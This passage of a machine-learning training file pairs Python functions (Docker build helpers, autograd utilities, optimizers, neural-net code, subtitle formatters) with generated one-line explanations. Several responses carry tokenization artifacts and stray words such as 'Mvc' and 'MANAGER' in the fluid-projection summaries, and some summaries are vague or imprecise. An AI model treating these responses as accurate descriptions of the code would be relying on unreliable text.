local_repo_dir is not None:\n        opts['{0}:local_repo_dir'.format(github_project)] = local_repo_dir\n\n    if (opts.get('os_image'), opts.get('gcc_version')) not in valid_versions:\n        raise Exception(\n            'Due to 4/5 ABI changes (std::string), we can only use {0}'.format(\n                ' / '.join('GCC {1} on {0}'.format(*p) for p in valid_versions)\n            )\n        )\n\n    if opts.get('docker_context_dir') is None:\n        opts['docker_context_dir'] = tempfile.mkdtemp(prefix='docker-context-')\n    elif not os.path.exists(opts.get('docker_context_dir')):\n        os.makedirs(opts.get('docker_context_dir'))\n\n    builder = DockerFBCodeBuilder(**opts)\n    context_dir = builder.option('docker_context_dir')  # Mark option \"in-use\"\n    # The renderer may also populate some files into the context_dir.\n    dockerfile = builder.render(get_steps_fn(builder))\n\n    with os.fdopen(os.open(\n        os.path.join(context_dir, 'Dockerfile'),\n        os.O_RDWR | os.O_CREAT | os.O_EXCL,  # Do not overwrite existing files\n        0o644,\n    ), 'w') as f:\n        f.write(dockerfile)\n\n    return context_dir", "response": "Create a Docker context directory for the given project."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nlogging some system diagnostics before / after setup for ease of debugging", "response": "def diagnostics(self):\n        'Log some system diagnostics before/after setup for ease of debugging'\n        # The builder's repr is not used in a command to avoid pointlessly\n        # invalidating Docker's build cache.\n        return self.step('Diagnostics', [\n            self.comment('Builder {0}'.format(repr(self))),\n            self.run(ShellQuoted('hostname')),\n            self.run(ShellQuoted('cat /etc/issue || echo no /etc/issue')),\n            self.run(ShellQuoted('g++ --version || echo g++ not installed')),\n            self.run(ShellQuoted('cmake --version || echo cmake not installed')),\n        ])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fb_github_project_workdir(self, project_and_path, github_org='facebook'):\n        'This helper lets Facebook-internal CI special-cases FB projects'\n        project, path = project_and_path.split('/', 1)\n        return self.github_project_workdir(github_org + '/' + project, path)", "response": "This helper lets Facebook - internal CI special - cases FB projects"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef make_gp_funs(cov_func, num_cov_params):\n\n    def unpack_kernel_params(params):\n        mean        = params[0]\n        cov_params  = params[2:]\n        noise_scale = np.exp(params[1]) + 0.0001\n        return mean, cov_params, noise_scale\n\n    def predict(params, x, y, xstar):\n        \"\"\"Returns the predictive mean and covariance at locations xstar,\n           of the latent function value f (without observation noise).\"\"\"\n        mean, cov_params, noise_scale = unpack_kernel_params(params)\n        cov_f_f = cov_func(cov_params, xstar, xstar)\n        cov_y_f = cov_func(cov_params, x, xstar)\n        cov_y_y = cov_func(cov_params, x, x) + noise_scale * np.eye(len(y))\n        pred_mean = mean +   np.dot(solve(cov_y_y, cov_y_f).T, y - mean)\n        pred_cov = cov_f_f - np.dot(solve(cov_y_y, cov_y_f).T, cov_y_f)\n        return pred_mean, pred_cov\n\n    def log_marginal_likelihood(params, x, y):\n        mean, cov_params, noise_scale = unpack_kernel_params(params)\n        cov_y_y = cov_func(cov_params, x, x) + noise_scale * np.eye(len(y))\n        prior_mean = mean * np.ones(len(y))\n        return mvn.logpdf(y, prior_mean, cov_y_y)\n\n    return num_cov_params + 2, predict, log_marginal_likelihood", "response": "Returns a list of functions that perform Gaussian process regression."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef def_linear(fun):\n    defjvp_argnum(fun, lambda argnum, g, ans, args, kwargs:\n                  fun(*subval(args, argnum, g), **kwargs))", "response": "Flags that a function is linear wrt all args"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef project(vx, vy):\n    p = np.zeros(vx.shape)\n    h = 1.0/vx.shape[0]\n    div = -0.5 * h * (np.roll(vx, -1, axis=0) - np.roll(vx, 1, axis=0)\n                    + np.roll(vy, -1, axis=1) - np.roll(vy, 1, axis=1))\n\n    for k in range(10):\n        p = (div + np.roll(p, 1, axis=0) + np.roll(p, -1, axis=0)\n                 + np.roll(p, 1, axis=1) + np.roll(p, -1, axis=1))/4.0\n\n    vx -= 0.5*(np.roll(p, -1, axis=0) - np.roll(p, 1, axis=0))/h\n    vy -= 0.5*(np.roll(p, -1, axis=1) - np.roll(p, 1, axis=1))/h\n    return vx, vy", "response": "Project the velocity field to be approximately mass - conserving and\n Mvc using a few iterations of Gauss - Seidel."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nwrapping a function so that its gradient can be specified and its invocation can be recorded. For examples, see the docs.", "response": "def primitive(f_raw):\n    \"\"\"\n    Wraps a function so that its gradient can be specified and its invocation\n    can be recorded. For examples, see the docs.\"\"\"\n    @wraps(f_raw)\n    def f_wrapped(*args, **kwargs):\n        boxed_args, trace, node_constructor = find_top_boxed_args(args)\n        if boxed_args:\n            argvals = subvals(args, [(argnum, box._value) for argnum, box in boxed_args])\n            if f_wrapped in notrace_primitives[node_constructor]:\n                return f_wrapped(*argvals, **kwargs)\n            parents = tuple(box._node for _     , box in boxed_args)\n            argnums = tuple(argnum    for argnum, _   in boxed_args)\n            ans = f_wrapped(*argvals, **kwargs)\n            node = node_constructor(ans, f_wrapped, argvals, kwargs, argnums, parents)\n            return new_box(ans, trace, node)\n        else:\n            return f_raw(*args, **kwargs)\n    f_wrapped.fun = f_raw\n    f_wrapped._is_autograd_primitive = True\n    return f_wrapped"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef logsumexp(x):\n    max_x = np.max(x)\n    return max_x + np.log(np.sum(np.exp(x - max_x)))", "response": "Numerically stable log sum of exp"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds a list of tuples for all layers.", "response": "def init_net_params(scale, layer_sizes, rs=npr.RandomState(0)):\n    \"\"\"Build a (weights, biases) tuples for all layers.\"\"\"\n    return [(scale * rs.randn(m, n),   # weight matrix\n             scale * rs.randn(n))      # bias vector\n            for m, n in zip(layer_sizes[:-1], layer_sizes[1:])]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef build_dataset(filename, max_lines=-1):\n    encodings = dict(list(map(reversed, enumerate(string.printable))))\n    digitize = lambda char: encodings[char] if char in encodings else len(encodings)\n    encode_line = lambda line: np.array(list(map(digitize, line)))\n    nonblank_line = lambda line: len(line) > 2\n\n    with open(filename) as f:\n        lines = f.readlines()\n\n    encoded_lines = list(map(encode_line, list(filter(nonblank_line, lines))[:max_lines]))\n    num_outputs = len(encodings) + 1\n\n    return encoded_lines, num_outputs", "response": "Loads a text file and turns each line into an encoded sequence."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef project(vx, vy, occlusion):\n    p = np.zeros(vx.shape)\n    div = -0.5 * (np.roll(vx, -1, axis=1) - np.roll(vx, 1, axis=1)\n                + np.roll(vy, -1, axis=0) - np.roll(vy, 1, axis=0))\n    div = make_continuous(div, occlusion)\n\n    for k in range(50):\n        p = (div + np.roll(p, 1, axis=1) + np.roll(p, -1, axis=1)\n                 + np.roll(p, 1, axis=0) + np.roll(p, -1, axis=0))/4.0\n        p = make_continuous(p, occlusion)\n\n    vx = vx - 0.5*(np.roll(p, -1, axis=1) - np.roll(p, 1, axis=1))\n    vy = vy - 0.5*(np.roll(p, -1, axis=0) - np.roll(p, 1, axis=0))\n\n    vx = occlude(vx, occlusion)\n    vy = occlude(vy, occlusion)\n    return vx, vy", "response": "Project the velocity field to be approximately mass - conserving and\n MANAGER using a few iterations of Gauss - Seidel."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmove field f according to x and y velocities u and v.", "response": "def advect(f, vx, vy):\n    \"\"\"Move field f according to x and y velocities (u and v)\n       using an implicit Euler integrator.\"\"\"\n    rows, cols = f.shape\n    cell_xs, cell_ys = np.meshgrid(np.arange(cols), np.arange(rows))\n    center_xs = (cell_xs - vx).ravel()\n    center_ys = (cell_ys - vy).ravel()\n\n    # Compute indices of source cells.\n    left_ix = np.floor(center_ys).astype(int)\n    top_ix  = np.floor(center_xs).astype(int)\n    rw = center_ys - left_ix              # Relative weight of right-hand cells.\n    bw = center_xs - top_ix               # Relative weight of bottom cells.\n    left_ix  = np.mod(left_ix,     rows)  # Wrap around edges of simulation.\n    right_ix = np.mod(left_ix + 1, rows)\n    top_ix   = np.mod(top_ix,      cols)\n    bot_ix   = np.mod(top_ix  + 1, cols)\n\n    # A linearly-weighted sum of the 4 surrounding cells.\n    flat_f = (1 - rw) * ((1 - bw)*f[left_ix,  top_ix] + bw*f[left_ix,  bot_ix]) \\\n                 + rw * ((1 - bw)*f[right_ix, top_ix] + bw*f[right_ix, bot_ix])\n    return np.reshape(flat_f, (rows, cols))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef unflatten_optimizer(optimize):\n    @wraps(optimize)\n    def _optimize(grad, x0, callback=None, *args, **kwargs):\n        _x0, unflatten = flatten(x0)\n        _grad = lambda x, i: flatten(grad(unflatten(x), i))[0]\n        if callback:\n            _callback = lambda x, i, g: callback(unflatten(x), i, unflatten(g))\n        else:\n            _callback = None\n        return unflatten(optimize(_grad, _x0, _callback, *args, **kwargs))\n\n    return _optimize", "response": "Takes an optimizer that operates on flat 1D numpy arrays and returns a\n    wrapped version that handles trees of nested containers with arrays and scalars at the leaves."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sgd(grad, x, callback=None, num_iters=200, step_size=0.1, mass=0.9):\n    velocity = np.zeros(len(x))\n    for i in range(num_iters):\n        g = grad(x, i)\n        if callback: callback(x, i, g)\n        velocity = mass * velocity - (1.0 - mass) * g\n        x = x + step_size * velocity\n    return x", "response": "Stochastic gradient descent with momentum.\n    grad must have signature grad x and i is the iteration number."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rmsprop(grad, x, callback=None, num_iters=100,\n            step_size=0.1, gamma=0.9, eps=10**-8):\n    \"\"\"Root mean squared prop: See Adagrad paper for details.\"\"\"\n    avg_sq_grad = np.ones(len(x))\n    for i in range(num_iters):\n        g = grad(x, i)\n        if callback: callback(x, i, g)\n        avg_sq_grad = avg_sq_grad * gamma + g**2 * (1 - gamma)\n        x = x - step_size * g/(np.sqrt(avg_sq_grad) + eps)\n    return x", "response": "Root mean squared prop"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef adam(grad, x, callback=None, num_iters=100,\n         step_size=0.001, b1=0.9, b2=0.999, eps=10**-8):\n    \"\"\"Adam as described in http://arxiv.org/pdf/1412.6980.pdf.\n    It's basically RMSprop with momentum and some correction terms.\"\"\"\n    m = np.zeros(len(x))\n    v = np.zeros(len(x))\n    for i in range(num_iters):\n        g = grad(x, i)\n        if callback: callback(x, i, g)\n        m = (1 - b1) * g      + b1 * m  # First  moment estimate.\n        v = (1 - b2) * (g**2) + b2 * v  # Second moment estimate.\n        mhat = m / (1 - b1**(i + 1))    # Bias correction.\n        vhat = v / (1 - b2**(i + 1))\n        x = x - step_size*mhat/(np.sqrt(vhat) + eps)\n    return x", "response": "Adam function for the given gradient function x."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef make_ica_funs(observed_dimension, latent_dimension):\n\n    def sample(weights, n_samples, noise_std, rs):\n        latents = rs.randn(latent_dimension, n_samples)\n        latents = np.array(sorted(latents.T, key=lambda a_entry: a_entry[0])).T\n        noise = rs.randn(n_samples, observed_dimension) * noise_std\n        observed = predict(weights, latents) + noise\n        return latents, observed\n\n    def predict(weights, latents):\n        return np.dot(weights, latents).T\n\n    def logprob(weights, latents, noise_std, observed):\n        preds = predict(weights, latents)\n        log_lik = np.sum(t.logpdf(preds, 2.4, observed, noise_std))\n        return log_lik\n\n    num_weights = observed_dimension * latent_dimension\n\n    def unpack_weights(weights):\n        return np.reshape(weights, (observed_dimension, latent_dimension))\n\n    return num_weights, sample, logprob, unpack_weights", "response": "This function returns the functions that implement independent component analysis."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nimplement a deep neural network for classification.", "response": "def neural_net_predict(params, inputs):\n    \"\"\"Implements a deep neural network for classification.\n       params is a list of (weights, bias) tuples.\n       inputs is an (N x D) matrix.\n       returns normalized class log-probabilities.\"\"\"\n    for W, b in params:\n        outputs = np.dot(inputs, W) + b\n        inputs = np.tanh(outputs)\n    return outputs - logsumexp(outputs, axis=1, keepdims=True)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing the l2 norm of params by flattening them into a vector.", "response": "def l2_norm(params):\n    \"\"\"Computes l2 norm of params by flattening them into a vector.\"\"\"\n    flattened, _ = flatten(params)\n    return np.dot(flattened, flattened)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef make_nn_funs(layer_sizes, L2_reg, noise_variance, nonlinearity=np.tanh):\n    shapes = list(zip(layer_sizes[:-1], layer_sizes[1:]))\n    num_weights = sum((m+1)*n for m, n in shapes)\n\n    def unpack_layers(weights):\n        num_weight_sets = len(weights)\n        for m, n in shapes:\n            yield weights[:, :m*n]     .reshape((num_weight_sets, m, n)),\\\n                  weights[:, m*n:m*n+n].reshape((num_weight_sets, 1, n))\n            weights = weights[:, (m+1)*n:]\n\n    def predictions(weights, inputs):\n        \"\"\"weights is shape (num_weight_samples x num_weights)\n           inputs  is shape (num_datapoints x D)\"\"\"\n        inputs = np.expand_dims(inputs, 0)\n        for W, b in unpack_layers(weights):\n            outputs = np.einsum('mnd,mdo->mno', inputs, W) + b\n            inputs = nonlinearity(outputs)\n        return outputs\n\n    def logprob(weights, inputs, targets):\n        log_prior = -L2_reg * np.sum(weights**2, axis=1)\n        preds = predictions(weights, inputs)\n        log_lik = -np.sum((preds - targets)**2, axis=1)[:, 0] / noise_variance\n        return log_prior + log_lik\n\n    return num_weights, predictions, logprob", "response": "This function returns a list of functions that can be used to compute the network for each training example."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef neural_net_predict(params, inputs):\n    inpW, inpb = params[0]\n    inputs = relu(np.dot(inputs, inpW) + inpb)\n    for W, b in params[1:-1]:\n        outputs = batch_normalize(np.dot(inputs, W) + b)\n        inputs = relu(outputs)\n    outW, outb = params[-1]\n    outputs = np.dot(inputs, outW) + outb\n    return outputs", "response": "Params is a list of weights and bias tuples. inputs is an N x D matrix."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a function that computes the sum of each column of the Jacobian of fun at x.", "response": "def elementwise_grad(fun, x):\n    \"\"\"\n    Returns a function that computes the sum of each column of the Jacobian of\n    `fun`, in one pass. If the Jacobian is diagonal, then this is the diagonal\n    of the Jacobian.\n    \"\"\"\n    vjp, ans = _make_vjp(fun, x)\n    if vspace(ans).iscomplex:\n        raise TypeError(\"Elementwise_grad only applies to real-output functions.\")\n    return vjp(vspace(ans).ones())"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a function which computes the Jacobian of fun with respect to the given positional argument number argnum.", "response": "def jacobian(fun, x):\n    \"\"\"\n    Returns a function which computes the Jacobian of `fun` with respect to\n    positional argument number `argnum`, which must be a scalar or array. Unlike\n    `grad` it is not restricted to scalar-output functions, but also it cannot\n    take derivatives with respect to some argument types (like lists or dicts).\n    If the input to `fun` has shape (in1, in2, ...) and the output has shape\n    (out1, out2, ...) then the Jacobian has shape (out1, out2, ..., in1, in2, ...).\n    \"\"\"\n    vjp, ans = _make_vjp(fun, x)\n    ans_vspace = vspace(ans)\n    jacobian_shape = ans_vspace.shape + vspace(x).shape\n    grads = map(vjp, ans_vspace.standard_basis())\n    return np.reshape(np.stack(grads), jacobian_shape)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef grad_named(fun, argname):\n    '''Takes gradients with respect to a named argument.\n       Doesn't work on *args or **kwargs.'''\n    arg_index = getargspec(fun).args.index(argname)\n    return grad(fun, arg_index)", "response": "Takes gradients with respect to a named argument.\n       Doesn t work on args and kwargs."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding a function that returns the exact Hessian - tensor product.", "response": "def hessian_tensor_product(fun, argnum=0):\n    \"\"\"Builds a function that returns the exact Hessian-tensor product.\n    The returned function has arguments (*args, tensor, **kwargs), and for\n    vectors takes roughly 4x as long to evaluate as the original function.\"\"\"\n    fun_grad = grad(fun, argnum)\n    def vector_dot_grad(*args, **kwargs):\n        args, vector = args[:-1], args[-1]\n        return np.tensordot(fun_grad(*args, **kwargs), vector, np.ndim(vector))\n    return grad(vector_dot_grad, argnum)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild a function that returns the exact tensor - Jacobian product that is left - multiplied by tensor.", "response": "def tensor_jacobian_product(fun, argnum=0):\n    \"\"\"Builds a function that returns the exact tensor-Jacobian product, that\n    is the Jacobian matrix left-multiplied by tensor. The returned function\n    has arguments (*args, tensor, **kwargs).\"\"\"\n    def vector_dot_fun(*args, **kwargs):\n        args, vector = args[:-1], args[-1]\n        return np.tensordot(vector, fun(*args, **kwargs), axes=np.ndim(vector))\n    return jacobian(vector_dot_fun, argnum)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild a function for evaluating the Jacobian - vector product at a point. Roughly 1. 5x more FLOPs than forward - mode plus memory requirements that scale with the number of primitives applied in the evaluation of f.", "response": "def make_jvp_reversemode(fun, x):\n    \"\"\"Builds a function for evaluating the Jacobian-vector product at a\n    point. Roughly 1.5x more FLOPs than forward-mode, plus memory requirements\n    that scale with the number of primitives applied in the evaluation of f, as\n    well as other overheads. See j-towns.github.io/2017/06/12/A-new-trick.html.\"\"\"\n    vjp, y = _make_vjp(fun, x)\n    vjp_vjp, _ = _make_vjp(vjp, vspace(y).zeros())\n    return vjp_vjp"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds a function for evaluating generalized - Gauss - Newton - vector products at a point. Slightly more expensive than mixed - mode.", "response": "def make_ggnvp(f, g=lambda x: 1./2*np.sum(x**2, axis=-1), f_argnum=0):\n    \"\"\"Builds a function for evaluating generalized-Gauss-Newton-vector products\n    at a point. Slightly more expensive than mixed-mode.\"\"\"\n    @unary_to_nary\n    def _make_ggnvp(f, x):\n        f_vjp, f_x = _make_vjp(f, x)\n        g_hvp, grad_g_x = _make_vjp(grad(g), f_x)\n        f_jvp, _ = _make_vjp(f_vjp, vspace(grad_g_x).zeros())\n        def ggnvp(v): return f_vjp(g_hvp(f_jvp(v)))\n        return ggnvp\n    return _make_ggnvp(f, f_argnum)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef value_and_grad(fun, x):\n    vjp, ans = _make_vjp(fun, x)\n    if not vspace(ans).size == 1:\n        raise TypeError(\"value_and_grad only applies to real scalar-output \"\n                        \"functions. Try jacobian, elementwise_grad or \"\n                        \"holomorphic_grad.\")\n    return ans, vjp(vspace(ans).ones())", "response": "Returns a function that returns both value and gradient. Suitable for use\n    in scipy. optimize."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding a function that returns the gradient of the first output and the ( unmodified ) second output of a function that returns two outputs.", "response": "def grad_and_aux(fun, x):\n    \"\"\"Builds a function that returns the gradient of the first output and the\n    (unmodified) second output of a function that returns two outputs.\"\"\"\n    vjp, (ans, aux) = _make_vjp(lambda x: atuple(fun(x)), x)\n    return vjp((vspace(ans).ones(), vspace(aux).zeros())), aux"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef multigrad_dict(fun):\n    \"Takes gradients wrt all arguments simultaneously,\"\n    \"returns a dict mapping 'argname' to 'gradval'\"\n\n    import funcsigs\n    sig = funcsigs.signature(fun)\n\n    def select(preds, lst):\n        idx = lambda item: next(\n            (i for i, pred in enumerate(preds) if pred(item)), len(preds))\n        results = [[] for _ in preds] + [[]]\n        for item in lst:\n            results[idx(item)].append(item)\n        return results\n\n    is_var_pos = lambda name: sig.parameters[name].kind == sig.parameters[name].VAR_POSITIONAL\n    is_var_kwd = lambda name: sig.parameters[name].kind == sig.parameters[name].VAR_KEYWORD\n    var_pos, var_kwd, argnames = select([is_var_pos, is_var_kwd], sig.parameters)\n\n    todict = lambda dct: {key:dct[key] for key in dct}\n\n    def apply_defaults(arguments):\n        defaults = {name: param.default for name, param in sig.parameters.items()\n                    if param.default is not param.empty}\n        return OrderedDict((name, arguments[name] if name in arguments else defaults[name])\n                           for name in sig.parameters)\n\n    def gradfun(*args, **kwargs):\n        bindings = sig.bind(*args, **kwargs)\n\n        args = lambda dct: tuple(dct[var_pos[0]]) if var_pos else ()\n        kwargs = lambda dct: todict(dct[var_kwd[0]]) if var_kwd else {}\n        others = lambda dct: tuple(dct[argname] for argname in argnames\n                                   if argname not in var_kwd + var_pos)\n\n        newfun = lambda dct: fun(*(others(dct) + args(dct)), **kwargs(dct))\n\n        argdict = apply_defaults(bindings.arguments)\n        grad_dict = grad(newfun)(dict(argdict))\n        return OrderedDict((argname, grad_dict[argname]) for argname in argdict)\n\n    return gradfun", "response": "Takes gradients wrt all arguments simultaneously"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a checkpointed version of fun that is used to compute intermediate values for the forward pass of fun.", "response": "def checkpoint(fun):\n    \"\"\"Returns a checkpointed version of `fun`, where intermediate values\n    computed during the forward pass of `fun` are discarded and then recomputed\n    for the backward pass. Useful to save memory, effectively trading off time\n    and memory. See e.g. arxiv.org/abs/1604.06174.\n    \"\"\"\n    def wrapped_grad(argnum, ans, args, kwargs):\n        return make_vjp(fun, argnum)(*args, **kwargs)[0]\n    wrapped = primitive(fun)\n    defvjp_argnum(wrapped, wrapped_grad)\n    return wrapped"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts an ASCII string to a one - hot encoding.", "response": "def string_to_one_hot(string, maxchar):\n    \"\"\"Converts an ASCII string to a one-of-k encoding.\"\"\"\n    ascii = np.array([ord(c) for c in string]).T\n    return np.array(ascii[:,None] == np.arange(maxchar)[None, :], dtype=int)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads a text file and turns each line into an encoded sequence.", "response": "def build_dataset(filename, sequence_length, alphabet_size, max_lines=-1):\n    \"\"\"Loads a text file, and turns each line into an encoded sequence.\"\"\"\n    with open(filename) as f:\n        content = f.readlines()\n    content = content[:max_lines]\n    content = [line for line in content if len(line) > 2]   # Remove blank lines\n    seqs = np.zeros((sequence_length, len(content), alphabet_size))\n    for ix, line in enumerate(content):\n        padded_line = (line + \" \" * sequence_length)[:sequence_length]\n        seqs[:, ix, :] = string_to_one_hot(padded_line, alphabet_size)\n    return seqs"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninitialize the nn parameters.", "response": "def init_nn_params(scale, layer_sizes, rs=npr.RandomState(0)):\n    \"\"\"Build a list of (weights, biases) tuples, one for each layer.\"\"\"\n    return [(rs.randn(insize, outsize) * scale,   # weight matrix\n             rs.randn(outsize) * scale)           # bias vector\n            for insize, outsize in zip(layer_sizes[:-1], layer_sizes[1:])]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef make_rfft_factors(axes, resshape, facshape, normshape, norm):\n    N = 1.0\n    for n in normshape: N = N * n\n\n    # inplace modification is fine because we produce a constant\n    # which doesn't go into autograd.\n    # For same reason could have used numpy rather than anp.\n    # but we already imported anp, so use it instead.\n    fac = anp.zeros(resshape)\n    fac[...] = 2\n    index = [slice(None)] * len(resshape)\n    if facshape[-1] <= resshape[axes[-1]]:\n        index[axes[-1]] = (0, facshape[-1] - 1)\n    else:\n        index[axes[-1]] = (0,)\n    fac[tuple(index)] = 1\n    if norm is None:\n        fac /= N\n    return fac", "response": "make the compression factors and compute the normalization\n    for irfft and rfft."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprovide a stochastic estimate of the variational lower bound for any variational family and model density.", "response": "def variational_lower_bound(params, t, logprob, sampler, log_density,\n                            num_samples, rs):\n    \"\"\"Provides a stochastic estimate of the variational lower bound,\n       for any variational family and model density.\"\"\"\n    samples = sampler(params, num_samples, rs)\n    log_qs = log_density(params, samples)\n    log_ps = logprob(samples, t)\n    log_ps = np.reshape(log_ps, (num_samples, -1))\n    log_qs = np.reshape(log_qs, (num_samples, -1))\n    return np.mean(log_ps - log_qs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the array g repeated along axis to fit vector space vs. Also returns the number of repetitions of the array g.", "response": "def repeat_to_match_shape(g, shape, dtype, axis, keepdims):\n    \"\"\"Returns the array g repeated along axis to fit vector space vs.\n       Also returns the number of repetitions of the array.\"\"\"\n    if shape == ():\n      return g, 1\n    axis = list(axis) if isinstance(axis, tuple) else axis\n    new_shape = onp.array(shape)\n    new_shape[axis] = 1\n    num_reps = onp.prod(onp.array(shape)[axis])\n    # Can't use broadcast_to because of numpy bug: https://github.com/numpy/numpy/issues/9165\n    # return anp.broadcast_to(anp.reshape(g, new_shape), shape), num_reps\n    return anp.reshape(g, new_shape) + onp.zeros(shape, dtype=dtype), num_reps"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef plot_images(images, ax, ims_per_row=5, padding=5, digit_dimensions=(28, 28),\n                cmap=matplotlib.cm.binary, vmin=None, vmax=None):\n    \"\"\"Images should be a (N_images x pixels) matrix.\"\"\"\n    N_images = images.shape[0]\n    N_rows = (N_images - 1) // ims_per_row + 1\n    pad_value = np.min(images.ravel())\n    concat_images = np.full(((digit_dimensions[0] + padding) * N_rows + padding,\n                             (digit_dimensions[1] + padding) * ims_per_row + padding), pad_value)\n    for i in range(N_images):\n        cur_image = np.reshape(images[i, :], digit_dimensions)\n        row_ix = i // ims_per_row\n        col_ix = i % ims_per_row\n        row_start = padding + (padding + digit_dimensions[0]) * row_ix\n        col_start = padding + (padding + digit_dimensions[1]) * col_ix\n        concat_images[row_start: row_start + digit_dimensions[0],\n                      col_start: col_start + digit_dimensions[1]] = cur_image\n    cax = ax.matshow(concat_images, cmap=cmap, vmin=vmin, vmax=vmax)\n    plt.xticks(np.array([]))\n    plt.yticks(np.array([]))\n    return cax", "response": "Plots the images in a matrix."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate a pinwheel from the given radial standard and tangential standard.", "response": "def make_pinwheel(radial_std, tangential_std, num_classes, num_per_class, rate,\n                  rs=npr.RandomState(0)):\n    \"\"\"Based on code by Ryan P. Adams.\"\"\"\n    rads = np.linspace(0, 2*np.pi, num_classes, endpoint=False)\n\n    features = rs.randn(num_classes*num_per_class, 2) \\\n        * np.array([radial_std, tangential_std])\n    features[:, 0] += 1\n    labels = np.repeat(np.arange(num_classes), num_per_class)\n\n    angles = rads[labels] + rate * np.exp(features[:,0])\n    rotations = np.stack([np.cos(angles), -np.sin(angles), np.sin(angles), np.cos(angles)])\n    rotations = np.reshape(rotations.T, (-1, 2, 2))\n\n    return np.einsum('ti,tij->tj', features, rotations)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef shannon_entropy(data, iterator):\n    if not data:\n        return 0\n    entropy = 0\n    for x in iterator:\n        p_x = float(data.count(x))/len(data)\n        if p_x > 0:\n            entropy += - p_x*math.log(p_x, 2)\n    return entropy", "response": "Calculates the shannon entropy of the given data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef srt_formatter(subtitles, padding_before=0, padding_after=0):\n    sub_rip_file = pysrt.SubRipFile()\n    for i, ((start, end), text) in enumerate(subtitles, start=1):\n        item = pysrt.SubRipItem()\n        item.index = i\n        item.text = six.text_type(text)\n        item.start.seconds = max(0, start - padding_before)\n        item.end.seconds = end + padding_after\n        sub_rip_file.append(item)\n    return '\\n'.join(six.text_type(item) for item in sub_rip_file)", "response": "Serialize a list of subtitles according to the SRT format with optional time padding."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nserializing a list of subtitles according to the VTT format.", "response": "def vtt_formatter(subtitles, padding_before=0, padding_after=0):\n    \"\"\"\n    Serialize a list of subtitles according to the VTT format, with optional time padding.\n    \"\"\"\n    text = srt_formatter(subtitles, padding_before, padding_after)\n    text = 'WEBVTT\\n\\n' + text.replace(',', '.')\n    return text"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nserializing a list of subtitles as a JSON blob.", "response": "def json_formatter(subtitles):\n    \"\"\"\n    Serialize a list of subtitles as a JSON blob.\n    \"\"\"\n    subtitle_dicts = [\n        {\n            'start': start,\n            'end': end,\n            'content': text,\n        }\n        for ((start, end), text)\n        in subtitles\n    ]\n    return json.dumps(subtitle_dicts)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef percentile(arr, percent):\n    arr = sorted(arr)\n    index = (len(arr) - 1) * percent\n    floor = math.floor(index)\n    ceil = math.ceil(index)\n    if floor == ceil:\n        return arr[int(index)]\n    low_value = arr[int(floor)] * (ceil - index)\n    high_value = arr[int(ceil)] * (index - floor)\n    return low_value + high_value", "response": "Calculate the given percentile of arr."}
